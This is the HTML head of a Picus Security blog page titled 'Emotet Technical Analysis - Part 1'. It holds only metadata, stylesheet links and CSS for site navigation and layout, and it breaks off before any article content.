<!doctype html><html lang="en-us"><head>
	<meta charset="utf-8">  
    
    

	
	<title>Emotet Technical Analysis - Part 1 Reveal the Evil Code</title>
	


  
	<link rel="shortcut icon" href="https://www.picussecurity.com/hubfs/Picus_February2020/images/favicon.ico">
	<meta name="description" content="Part 1: Emotet Technical Analysis series. All techniques used by attackers are mapped to tactics and techniques in the MITRE ATT&amp;CK Framework.">
	
	
	
	
	
 
	
	
	<meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="Part 1: Emotet Technical Analysis series. All techniques used by attackers are mapped to tactics and techniques in the MITRE ATT&amp;CK Framework.">
    <meta property="og:title" content="Emotet Technical Analysis - Part 1 Reveal the Evil Code">
    <meta name="twitter:description" content="Part 1: Emotet Technical Analysis series. All techniques used by attackers are mapped to tactics and techniques in the MITRE ATT&amp;CK Framework.">
    <meta name="twitter:title" content="Emotet Technical Analysis - Part 1 Reveal the Evil Code">

    

    
	
	<meta property="og:image" content="https://www.picussecurity.com/hubfs/Emotet-social-2.jpg">
	
	
	
	
	
	
	
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hubfs/hub_generated/template_assets/1/32300424271/1741677747588/template_main.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/32300424286/1711704470960/Shield/css/theme-overrides.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/119013969479/1686049622830/Picus_IL_Shared/Shared_by_Themes/asset/slick-theme.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hubfs/hub_generated/module_assets/1/113292746136/1734698096927/module_Announcement_Bar.min.css">

<link rel="stylesheet" type="text/css" href="https://www.picussecurity.com/hubfs/slick.css">
<link rel="stylesheet" type="text/css" href="/hs-fs/hub/7048931/hub_generated/template_assets/119013969479/1686049622830/Picus_IL_Shared/Shared_by_Themes/asset/slick-theme.min.css">

<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/155086192011/1711467339040/Shield/css/elements/buttons_24_live_temp.min.css">

<style>
 .mm-bg {
	background-color: #fff;
 }

 .dropdown > div > a {
  pointer-events: none;
 }
 div.custom-menu-primary-mega div.hs-menu-item {
  cursor: pointer;
 }

 .hs-blog-post .mm-bg .header__logo--main:after {
	background-image: none;
 }
 div.custom-menu-primary-mega div.hs-menu-item button.submenu-toggle{
	display: none;
	border: 0;
	outline: 0;
 }
 @media (max-width: 767px) {
	.light-nav-mobile-true .header .header__logo--main img.default{
	 display: block;
	}
	.light-nav-mobile-true .header .header__logo--main img.on-scroll{
	 display: none;
	}
 }
 .extra-menu ul {
	width: 100%;
	padding-left: 2px;
	margin-top: -25px;
 }
 .extra-menu ul li {
	display: inline-block;
	float: left !important;
	width: auto !important;
	margin-right: 25px;
 }
 .extra-menu ul li a {
	font-size: 0.8em;
	font-weight: 500;
 }
 .custom-menu-primary-mega div.hs-item-has-children {
	position: relative;
 }
 .custom-menu-primary-mega div.hs-item-has-children:after {
	position: absolute;
	content: '';
	background-image: url('https://www.picussecurity.com/hubfs/Shield/Images/mega-menu-down-arrow.png');
	width: 7px;
	height: 4px;
	right: 5px;
	top: 4px;
 }
 .custom-menu-primary-mega div.hs-menu-item {
	float: left;
 }

 div.custom-menu-primary-mega div.hs-menu-item {
	display: inline-block;
	position: relative;
	padding: 0px 18px 32px;
	font-size: 13px;
 }
 div.custom-menu-primary-mega div.hs-menu-item a {
	text-decoration: none;	
	font-weight: 500;
	transition: color 0.3s;
	text-transform: uppercase;
 }


 div.custom-menu-primary-mega div.hs-menu-item a:hover,
 div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal>ul li.hs-menu-depth-1 a:hover {
	color:#E8055D;
	text-decoration: none;
 }

 div.custom-menu-primary-mega div.dropdown {
	float: left;
	overflow: hidden;
 }
 header.header.announce_prev div.custom-menu-primary-mega div.dropdown a.cta_button{
	display: none!important;
 }
 header.header.announce_prev div.custom-menu-primary-mega div.dropdown:hover a.cta_button{
	display: inline-block!important;
 }
 div.custom-menu-primary-mega div.dropdown:nth-of-type(2):hover:before {
	margin-left: 6%;
 }
 div.custom-menu-primary-mega div.dropdown:nth-of-type(3):hover:before {
	margin-left: 2.2%;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content {
	visibility: hidden;
	opacity: 0;
	transition: visibility 0s, opacity 0.3s linear;
	position: absolute;
	top: 83px;	
	width: 100%;
	left: 0;
	box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
	z-index: 1;
	padding: 30px;
	min-height: 325px;
 }
 body div.custom-menu-primary-mega div.dropdown .dropdown-content,
 body div.custom-menu-primary-mega div.dropdown:hover .dropdown-content,
 body .header div.custom-menu-primary-mega div.dropdown:hover .dropdown-content{
	background-color: #fff;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content span.h3 {
	color: var(--primary-navy);
	font-weight: bold;
    display: block;
    margin-bottom: 25px;
 }
 div.custom-menu-primary-mega div.dropdown:hover .dropdown-content {
	visibility: visible;
	opacity: 1;
	background-image: url(https://www.picussecurity.com/hubfs/Shield/Images/mega-menu-background-2.png);
	background-repeat: no-repeat;
	background-position: 110% 101%;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content div.page-center {
	max-width: 1240px;
	margin: 0 auto;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .overview,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .menu1,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .menu2 {
	width: 30%;
	margin-right: 5%;
	float: left;
	min-height: 282px;
 }

 div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu1,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu2,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu3 {
	width: 21%;
	float: left;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu1,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu2,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu3 {
	margin-right: 3%;
	width: 22%;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .overview {
	width: 20%;
	font-size: 16px;
	padding-right: 0;
	text-transform: none;
	padding-top: 10px;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .overview h3 {
	color:#004285;
	margin-bottom: 5px;
	font-size: 20px;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .overview p,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .overview a {
	font-size: 14px;
	line-height: 1.4em;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .menu1,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .menu2,
 div.custom-menu-primary-mega div.dropdown .dropdown-content .menu3 {
	padding-top: 10px;
 }

 div.custom-menu-primary-mega div.custom-menu-primary-mega .hs-menu-wrapper > ul,
 div.custom-menu-primary-mega div.custom-menu-primary-mega .hs-menu-wrapper > ul > li {
	background: transparent;
 }
 div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal > ul li.hs-menu-depth-1 {
	float: none;
	width: 80%;
	margin-bottom: 16px;
 }
 div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal > ul li.hs-menu-depth-1 a {
	color: var(--primary-navy);
	font-size: 20px;
	text-transform: none;
	line-height: 30px;
	font-weight: 700;
 }
 div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal > ul li.hs-menu-depth-1 a span {

 }
 div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal > ul li.hs-menu-depth-1 a:hover {
	color: var(--primary-fuchsia);
 }
 .mobile-hidden {
	display: none;
 }
 div.custom-menu-primary-mega .dropdown-content .resources .post-image {
	width: 100%; 
	height: 158px;  
	position: relative;
 }
 div.custom-menu-primary-mega .dropdown-content .resources .post-image img{
	object-fit: cover;
	width: 100%;
	height: 100%;
 }
 div.custom-menu-primary-mega .dropdown-content .resources .menu-post-content {
	padding: 20px;
	position: relative;
	padding-bottom: 60px;
 }
 div.custom-menu-primary-mega .dropdown-content .resources .resource-post {
	background: #fff;
 }
 div.custom-menu-primary-mega .dropdown-content .resources .menu-post-content h4 {
	text-transform: none;
	min-height: 80px;
	font-size: 16px;
	text-transform: none;
	line-height: 1.15em;
 }
 div.custom-menu-primary-mega p.latest-read-more{
	font-size: 14px;
	bottom: 25px;
 }

 /* Mobile menu */
 div.custom-menu-primary-mega a.icon {
	display: none;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col.no-second-col .overview {
	width: 60%;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col.no-second-col .overview img{
	margin-left: auto!important;
	margin-right: 0!important;
 }

 .custom-menu-primary-mega div.menu-button> a.free-trial,
 .custom-menu-primary-mega div.menu-button> a.start-your-free-trial {
	border: 2px solid #003758;
	border-radius: 3px;
	background: #003758;
	color: #fff;
	padding: 10px 15px;
	margin-top: -12px;
	margin-right: 0;
	transition: all .3s ease;
	text-transform: uppercase;
	font-weight: bold;
	font-size: 12px;
 }
 .custom-menu-primary-mega div.menu-button> a.free-trial:hover,
 .custom-menu-primary-mega div.menu-button> a.start-your-free-trial:hover {
	border: 2px solid #003758;
	border-radius: 3px;
	background: #003758;
	color: #fff;
	padding: 10px 15px;
	margin-top: -12px;
	margin-right: 0;
	transition: all .3s ease;
	text-transform: uppercase;
	font-weight: bold;
	font-size: 12px;
 }
 .custom-menu-primary-mega div.menu-button:last-of-type> a.login, 
 .custom-menu-primary-mega div.menu-button:last-of-type> a.contact-us,
 .hs-menu-item.hs-menu-depth-1.menu-button.bg-color-green a{
	border: 2px solid #00A186;
	border-radius: 3px;
	background: #00A186;
	color: #fff;
	padding: 10px 15px;
	margin-top: -12px;
	margin-right: 0;
	transition: all .3s ease;
	text-transform: uppercase;
	font-weight: bold;
	font-size: 12px;
 }

 .hs-menu-item.hs-menu-depth-1.menu-button.bg-color-blue a{
	border: 2px solid #003758;
	border-radius: 3px;
	background: #003758;
	color: #fff;
	padding: 10px 15px;
	margin-top: -12px;
	margin-right: 0;
	transition: all .3s ease;
	text-transform: uppercase;
	font-weight: bold;
	font-size: 12px;
 }

 .custom-menu-primary-mega div.menu-button:last-of-type> a.login,
 .custom-menu-primary-mega div.menu-button:last-of-type> a.request-a-demo {
	border: 2px solid #00A186;
	border-radius: 3px;
	background: #00A186;
	color: #fff;
	padding: 10px 15px;
	margin-top: -12px;
	margin-right: 0;
	transition: all .3s ease;
	text-transform: uppercase;
	font-weight: bold;
	font-size: 12px;
 }

 .custom-menu-top {
	margin-left:auto;
	display:flex;
	justify-content:flex-end;
	margin-bottom:25px;
	margin-right:20px;
 }

 .custom-menu-top .item-list {
	color:#00293B;
	font-size:14px;
	font-weight:bold;
	text-transform:uppercase;
	display:flex;
 }


 .custom-menu-top .divider {
	margin:0px 15px;
	font-weight:normal;
 }

 .custom-menu-top svg {
	max-width:12px;
	width:12px;
	margin-right:7px;
 }
 .header__row-1 {
	padding-top:0px;
 }

 .mobile-only {
	display:none;
 }

 header .custom-menu-primary-mega.header__navigation.header--element > div:nth-last-child(2) {
	margin-right: -25px;
 }


 .featured-card {
	display: flex;
	gap: 10px;
	padding: 30px;
	margin-bottom: 32px;
	align-items: center;
	font-family: var(--secondary-font);
	background: linear-gradient(to left bottom, transparent 50%, rgb(245 245 245) 0) no-repeat 100% 0 / 2em 2em, linear-gradient(-135deg, transparent 1.41em, #F5F5F5 0);
	position: relative;
 }
 .featured-card a.abs-url {
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0;
	left: 0;
 }
 .card-content span {
	display: block;
 }
 .featured-card .title{
	font-size: 14px;
	line-height: 14px;
	text-transform: uppercase;
	font-weight: 600;
	margin-bottom: 4px;
	color: var(--primary-navy);
 }
 .featured-card .description {
	font-size: 16px;
	line-height: 19px;
	font-weight: 700;
	color: var(--primary-navy);
 }
 .card-visual {
	min-width: 60px;
	max-width: 60px;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content span.h3{
	text-transform: uppercase;
	font-size: 20px;
	line-height: 36px;
	display: inline-block;
	position: relative;
 }
 div.custom-menu-primary-mega div.dropdown .dropdown-content span.h3:before {
	content: "";
	position: absolute;
	background-color: var(--primary-fuchsia);
	bottom: -5px;
	height: 4px;
	width: 100%;
	border-radius: 8px;
 }
 .header .hs-menu-wrapper.flyouts .hs-menu-children-wrapper li{
	padding:0;
 }
 .header li.hs-menu-item.hs-menu-depth-2 i {
	content: url(/hubfs/2023%20-%20Optimization/Rectangle%20102.svg);
	padding: 0;
	margin-right: 6px;
 }
 body header.header.announce_prev .dt-mobile-burger {
	background-color: initial;
 }


 @media (min-width: 1100px) {
	.custom-menu-primary-mega ul li.hs-menu-depth-1:last-of-type {
	 border: none;
	 background: none;
	 color: #00293b;
	 padding: 0;
	 font-weight: normal;
	 margin-top: 0px;
	}
	.hs-menu-wrapper.flyouts .hs-menu-children-wrapper{
	 margin-left: 8px;
	}
	.header .hs-menu-wrapper.flyouts .hs-menu-children-wrapper li.hs-menu-item.hs-menu-depth-2 a {
	 font-size: 18px;
	 font-weight: normal !important;
	}
	.custom-menu-primary-mega div.menu-button:last-of-type > a.start-your-free-trial,
	.custom-menu-primary-mega div.menu-button:last-of-type > a.free-trial{
	 border: 2px solid #003758;
	 border-radius: 3px;
	 background: #003758;
	 color: #fff;
	 padding: 10px 15px;
	 margin-top: -12px;
	 margin-right: 0;
	 transition: all .3s ease;
	 text-transform: uppercase;
	 font-weight: bold;
	 font-size: 12px;
	}
	header .custom-menu-primary-mega div.menu-button:last-of-type > a.test-log4shell-attacks {
	 border: 2px solid var(--primary-fuchsia);
	 background: var(--primary-fuchsia);
	 color: #fff;
	 padding: 10px 15px;
	 margin-top: -12px;
	 margin-right: 0;
	 transition: all .3s ease;
	 text-transform: uppercase;
	 font-weight: bold;
	 font-size: 12px;
	}
	body header .custom-menu-primary-mega.header__navigation.header--element > div:nth-last-child(2){
	 margin-right: auto!important;
	}
	body header .custom-menu-primary-mega.header__navigation.header--element>div:last-child {
	 margin-right: -20px !important;
	}
 }

 @media screen and (max-width: 1100px) {
	.header__logo--main {
	 padding-top: 12px;
	 margin-top: -8px; 
	} 

	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu1, 
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu2 {
	 padding-top: 20px;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .menu1,
	div.custom-menu-primary-mega div.dropdown .dropdown-content .menu2{
	 min-height: initial;
	}
	.menu-type.resources.three-col {
	 display: flex;
	 flex-direction: column-reverse;
	}
	.extra-menu ul {
	 margin-top: 20px;
	}
	div.custom-menu-primary-mega div.hs-menu-item a {
	 color: var(--picus-blue);
	}
	div.custom-menu-primary-mega .dropdown.clicked{
	 margin-bottom: 16px;
	}
	div.custom-menu-primary-mega .dropdown.clicked div.hs-menu-item a:before {
	 content: "";
	 height: 4px;
	 width: 100%;
	 display: block;
	 background-color: var(--primary-fuchsia);
	 position: absolute;
	 bottom: -6px;
	}
	.header__row-2,
	.header__navigation {
	 display: none;
	}
	.header__row-2.active,
	.header__navigation.active {
	 display: inline-block;
	 background: #f7f7f7;
	 margin-top: 30px;
	 padding-top: 35px;
	 border-top: 2px solid #002A3B;
	 border-bottom: 2px solid #002A3B;
	}
	div.custom-menu-primary-mega div.dropdown {
	 width: 100%;
	}
	div.custom-menu-primary-mega div.hs-menu-item {
	 padding-bottom: 40px;
	}
	div.custom-menu-primary-mega div.menu-button {
	 width: 100%;
	}
	div.custom-menu-primary-mega div.menu-button a {
	 font-size: 18px;
	}

	div.custom-menu-primary-mega div.dropdown .dropdown-content span.h3,
	div.custom-menu-primary-mega div.hs-item-has-children a,
	div.custom-menu-primary-mega div.menu-button a {
	 font-size: 20px;
	 font-weight: 600;
	}
	body div.hs-menu-item.hs-menu-depth-1.menu-button.bg-color-blue a{
	 font-size: 18px!important;
	 line-height: 18px;
	 display: inline-flex;
	}
	.hs-menu-item.hs-menu-depth-1.menu-button.bg-color-blue a:before{
	 content: "";
	 position: absolute;
	 bottom: -8px;
	 height: 2px;
	 background-color: var(--primary-fuchsia);
	 display: block;
	 width: 100%;
	}
	.hs-menu-item.hs-menu-depth-1.menu-button.bg-color-pink{
	 width: auto;
	}
	div.custom-menu-primary-mega div.hs-menu-item:last-of-type a {
	 padding: 0;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .overview {
	 display: none;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu1, 
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu2, 
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu3,
	div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col .menu1, 
	div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col .menu2,
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu1, 
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu2, 
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu3 {
	 width: 100%;
	 border-left: none;
	 border-right: none;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content {
	 top: 32px;
	}
	div.custom-menu-primary-mega div.dropdown:not(.no-hover):hover .dropdown-content {
	 visibility: visible;
	 opacity: 1;
	}
	div.custom-menu-primary-mega div.dropdown.no-hover:hover .dropdown-content {
	 visibility: hidden;
	 opacity: 0;
	}

	div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal>ul li.hs-menu-depth-1 a {
	 font-size: 16px;
	}
	.dt-mobile-burger {
	 position: absolute;
	 right: 30px;
	 top: 35px;
	 display: block !important;
	}
	.dt-mobile-burger .burger.hide,
	.dt-mobile-burger .close {
	 display: none;
	}
	.dt-mobile-burger .close.show {
	 display: block;
	}
	div.custom-menu-primary-mega div.dropdown:hover .dropdown-content {
	 background-image: none;
	}
	div.custom-menu-primary-mega .dropdown-content .resources .menu-post-content h4 {
	 text-transform: none;
	 min-height: 10px;
	}
	.custom-menu-primary-mega div.hs-item-has-children:after {
	 top: 7px;
	}
 }
 @media screen and (min-width: 600px) and (max-width: 1100px) {
	.header__navigation.active {
	 margin-top: 50px;
	 position: absolute;
	 left: 0;
	}
	.header__logo--main {
	 padding-top: 9px;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content {
	 top: 0px;
	}

	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu1, div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu2, div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col .menu3, div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col .menu1, div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col .menu2 {
	 width: 33%;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu1, div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu2, div.custom-menu-primary-mega div.dropdown .dropdown-content .three-col.resources .menu3 {
	 width: 30%;
	}
	div.custom-menu-primary-mega .dropdown-content .resources .menu-post-content h4 {
	 min-height: 100px;
	}
 }
 @media (max-width: 1100px) {
	.custom-menu-top {
	 display:none;
	}

	.mobile-only {
	 display:block;
	}
	header .custom-menu-primary-mega.header__navigation.header--element > div:nth-last-child(2) {
	 margin-right: 0px;
	}
 }


 @media (max-width: 1100px){

	div.custom-menu-primary-mega div.hs-item-has-children{	 
	 display: flex;
	 align-items: center;
	}
	.custom-menu-primary-mega div.hs-item-has-children:after{
	 display: none;
	}
	div.custom-menu-primary-mega div.hs-menu-item a{
	 display: inline;
	 position: relative;
	}
	div.custom-menu-primary-mega div.hs-menu-item button.submenu-toggle {
	 background: none;
	 border: 0;
	 content: '';
	 background-image: url(https://www.picussecurity.com/hubfs/Shield/Images/mega-menu-down-arrow.png);
	 background-repeat: no-repeat;
	 width: 25px;
	 height: 25px;
	 background-size: 10px;	
	 z-index: 9;
	 display: flex;
	 align-items: center;
	 background-position: center;
	 display: block;
	}
	div.custom-menu-primary-mega div.dropdown.clicked button.submenu-toggle{
	 transform: rotate(180deg); /* Rotate the button 180 degrees */
	}

	body header.header.announce_prev div.custom-menu-primary-mega div.dropdown .dropdown-content{
	 position: relative;
	 top: auto;
	 background-color: transparent;
	 box-shadow: none;
	 visibility: hidden;
	 opacity: 0!important;
	 transition: opacity 0.3s ease, visibility 0.3s ease, max-height 0.3s ease;
	 max-height: 0; /* Set max-height to 0 to hide the content */
	 overflow: hidden;
	 min-height: initial;
	 padding-top: 0;
	}
	body header.header.announce_prev div.custom-menu-primary-mega div.dropdown .dropdown-content:not(.visible){
	 padding-top: 0;
	 padding-bottom: 0;
	}
	body header.header.announce_prev div.custom-menu-primary-mega div.dropdown .dropdown-content.visible{	
	 display: block;
	 visibility: visible;
	 opacity: 1!important;		
	 transition: opacity 0.5s ease 0.3s, visibility 0s 0s, max-height 0.5s ease-out; /* Adjust timing for showing content */
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content span.h3{
	 margin-top: 0;
	}
	.menu-type.two-col.second-col-exists .menu1{
	 padding-top: 0!important;
	}
	.menu-type.two-col.second-col-exists .menu1 > span.h3 {
	 display: none;
	}
 }
 @media (min-width: 1100px){
	header.header.announce_prev{
	 position: fixed;
	}
	body header.header.announce_prev div.custom-menu-primary-mega div.dropdown .dropdown-content{
	 top: 195px;
	 padding-right: 0;
	 padding-top: 50px;
	}
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .menu1, 
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .menu2, 
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .menu3,
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .overview{
	 padding-top: 0;
	}
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .menu1,
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .menu2{
	 margin-right: 30px;
	 width: 26%;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .overview{
	 flex-grow: 1;
	}
	body div.custom-menu-primary-mega div.dropdown .dropdown-content div.page-center {
	 max-width: 1200px;
	 margin: 0 auto;
	 margin-left: auto;
	 margin-right: 0;
	}
	body div.custom-menu-primary-mega .hs-menu-wrapper.hs-menu-flow-horizontal>ul li.hs-menu-depth-1{
	 margin-bottom: 10px!important;
	}
	body div.custom-menu-primary-mega li.hs-menu-item.hs-menu-depth-2 {
	 margin:0;	 
	}
	body header.header.announce_prev .header__container.content-wrapper{
	 position: static;
	}

	body header .hs-menu-item.hs-menu-depth-1.menu-button.bg-color-blue{
	 top: 2px;
	}
	body div.custom-menu-primary-mega div.dropdown .dropdown-content{
	 padding-bottom: 160px;
	 background-image: url(/hubfs/2023%20-%20Optimization/dropdown-bg.svg) !important;
	 width: calc(100% - ((100% - 1200px) / 2));

	 background-size: contain;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content span.h3{
	 margin-top: 0;
	}
	.menu-type.two-col.second-col-exists {
	 display: flex;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .overview{
	 min-width: 400px;
	 max-width: 400px;
	 margin-right: auto;
	 margin-left: auto;
	}
	div.custom-menu-primary-mega div.dropdown .dropdown-content .menu1 {
	 border-right: 3px solid #f5f5f5;
	}
	body .menu-type.two-col.no-second-col {
	 display: flex;
	}
	body div.custom-menu-primary-mega div.dropdown .dropdown-content .two-col.no-second-col .overview {
	 width: 400px;
	 margin-left: auto;
	}
	body .hs-menu-wrapper.flyouts .hs-menu-children-wrapper a {
	 display: block;
	 white-space: initial;
	}

 }

</style>

<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/module_assets/39038130957/1608575808109/module_39038130957_Lead-Magnet-Banner.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hubfs/hub_generated/template_assets/1/158846858310/1740739716364/template_main-blog.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hubfs/hub_generated/module_assets/1/115636353426/1741437750102/module_glossary-toc.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/template_assets/154797347330/1729693014912/Shield/css/components/s2-slick-style.min.css">
<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hubfs/hub_generated/template_assets/1/154512352373/1738152388947/template_s2-generic-2024.min.css">
<style>#hs_cos_wrapper_module_17207012175882 .s2-featured-posts {}

#hs_cos_wrapper_module_17207012175882 .s2-featured-post__eyebrow { color:#34627D; }

#hs_cos_wrapper_module_17207012175882 .s2-featured-post__title { color:#001c2f; }

#hs_cos_wrapper_module_17207012175882 .s2-featured-posts__item {
  background-color:#FFFFFF;
  box-shadow:0px 0px 20px 0px rgba(224,231,235,75%);
}

@media (min-width:992px) {
  #hs_cos_wrapper_module_17207012175882 .s2-featured-posts {}
}
</style>

<style>
 .s2-featured-posts {
  position: relative;
 }
 .s2-featured-post__eyebrow{
  color: #34627D;
 }
 .s2-featured-posts__item {
  background: #fff;
  margin-bottom:22px;
  display: inline-flex !important;
  flex-direction: column;
  justify-content: space-between;
  box-shadow: 0px 0px 20px 0px rgba(224,231,235,75%);
 }

 .s2-featured-post__thumb img {
  width: 100%;
  flex: 0 0 auto;
 }

 .s2-featured-post__copy {
  padding: 35px 30px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  flex: 1;
 }

 .s2-featured-post__button{
  margin-top:20px;
 }

 .s2-featured-post__title {
  font-weight: 700!important;
  display: -webkit-box;
  -webkit-line-clamp: 3;
  -webkit-box-orient: vertical;
  overflow: hidden;
  margin-bottom:0;
 }

 .s2-featured-posts__slider .slick-slide {
  margin: 0 15px
 }

 .s2-featured-posts__slider .slick-list {
  padding-top: 30px;
  padding-bottom: 25px;
 }

 .s2-featured-posts__slider .slick-track {
  display: flex;
 }

 .s2-featured-posts__slider .slick-slide {
  height: auto;
 }
 .s2-featured-posts__slider .slick-slide>div,
 .s2-featured-posts__item {
  height: 100%;
 }

 .s2-featured-posts[data-theme="blue"] button.slick-prev.slick-arrow svg,
 .s2-featured-posts[data-theme="blue"] button.slick-next.slick-arrow svg{
  color: #005dba;
 }
 
 .s2-featured-posts.red-report button.slick-prev.slick-arrow svg,
 .s2-featured-posts.red-report button.slick-next.slick-arrow svg{
  color: #D80033;
 }
 .s2-featured-posts__arrows {
  position: relative;
  display: flex;
  justify-content: center;
  margin-bottom: 10px;
 }

 .s2-featured-posts__arrows .slick-next:not(.slick-hidden),
 .s2-featured-posts__arrows .slick-prev:not(.slick-hidden) {
  display: block;
  margin: 10px;
 }  
 .s2-featured-posts__arrows .slick-prev:hover,
 .s2-featured-posts__arrows .slick-prev:focus,
 .s2-featured-posts__arrows .slick-next:hover,
 .s2-featured-posts__arrows .slick-next:focus{
  color:var(--secondary-color)!important;
 }

 @media (min-width: 768px) {
 .s2-featured-posts__arrows {
  justify-content: flex-end;
 }
  .s2-featured-posts__slider .slick-list  {
   padding-top: 50px;
   overflow: visible;
  }

  .s2-featured-post__copy {
   padding: 35px 40px;
  }

 }

 @media (min-width: 1200px) {
  .s2-featured-posts__arrows {
   position: absolute;
   bottom: 100%;
   right: 0;
  }
  .s2-featured-posts{
   padding-right:60px;
   margin-left:-15px;
  }
 }

</style>


<link rel="preload" href="https://picussecurity.com/hubfs/2023%20-%20Optimization/pattern-banner-image-2544x754-70kb.jpg" as="image">

<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hub/7048931/hub_generated/module_assets/153850846592/1711461276903/module_153850846592_footer-subscribe-column.min.css">
<link rel="preload" as="style" href="https://48752163.fs1.hubspotusercontent-na1.net/hubfs/48752163/raw_assets/media-default-modules/master/484/js_client_assets/assets/TrackPlayAnalytics-Cm48oVxd.css">

<link rel="preload" as="style" href="https://48752163.fs1.hubspotusercontent-na1.net/hubfs/48752163/raw_assets/media-default-modules/master/484/js_client_assets/assets/Tooltip-DkS5dgLo.css">

<style>
  @font-face {
    font-family: "Inter";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Inter/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Inter/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Red Hat Display";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Red_Hat_Display/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Red_Hat_Display/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Red Hat Display";
    font-weight: 700;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Red_Hat_Display/700.woff2") format("woff2"), url("/_hcms/googlefonts/Red_Hat_Display/700.woff") format("woff");
  }
  @font-face {
    font-family: "Red Hat Text";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
